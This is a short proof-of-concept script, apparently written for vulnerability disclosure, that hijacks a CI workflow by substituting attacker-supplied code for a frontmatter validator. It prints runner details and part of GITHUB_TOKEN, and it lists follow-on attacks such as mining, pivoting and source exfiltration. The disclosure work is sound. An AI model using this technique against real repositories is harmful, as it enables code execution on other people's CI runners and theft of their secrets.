#!/usr/bin/env bun
/**
 * PoC: Harmless proof that this script is attacker-controlled.
 *
 * This replaces the real validate-frontmatter.ts to demonstrate
 * that the validate-frontmatter workflow executes code from the
 * PR branch, not from the protected main branch.
 *
 * It does NOT:
 *   - Exfiltrate data
 *   - Modify the repository
 *   - Access secrets
 *   - Install malware
 *   - Contact external servers
 *
 * It ONLY prints environment info visible in the workflow logs.
 */

console.log(`
========================================
  CI HIJACK PoC — PROOF OF EXECUTION
========================================

This script was supplied by the PR author.
The workflow checked out and executed attacker-controlled code.

--- Environment Evidence ---
Runner OS:       ${process.env.RUNNER_OS ?? "unknown"}
Runner Arch:     ${process.env.RUNNER_ARCH ?? "unknown"}
Runner Name:     ${process.env.RUNNER_NAME ?? "unknown"}
Repository:      ${process.env.GITHUB_REPOSITORY ?? "unknown"}
PR Number:       ${process.env.GITHUB_REF ?? "unknown"}
Trigger Event:   ${process.env.GITHUB_EVENT_NAME ?? "unknown"}
Workflow:        ${process.env.GITHUB_WORKFLOW ?? "unknown"}
Run ID:          ${process.env.GITHUB_RUN_ID ?? "unknown"}
Run URL:         https://github.com/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}
Actor:           ${process.env.GITHUB_ACTOR ?? "unknown"}
SHA:             ${process.env.GITHUB_SHA ?? "unknown"}

--- What an attacker could do here ---
• Run arbitrary code on this runner (cryptomining, pivoting)
• Read the GITHUB_TOKEN (read-only, but still leaks repo metadata)
• Exfiltrate source code (moot for public repos, critical for private)
• Abuse runner network access to scan internal infrastructure

--- Token Permissions (proving read-only) ---
GITHUB_TOKEN first 4 chars: ${(process.env.GITHUB_TOKEN ?? "unset").substring(0, 4)}****
(Token NOT exfiltrated — just proving it exists and is accessible)

========================================
  END PoC — No destructive action taken
========================================
`);

// Exit cleanly
process.exit(0);
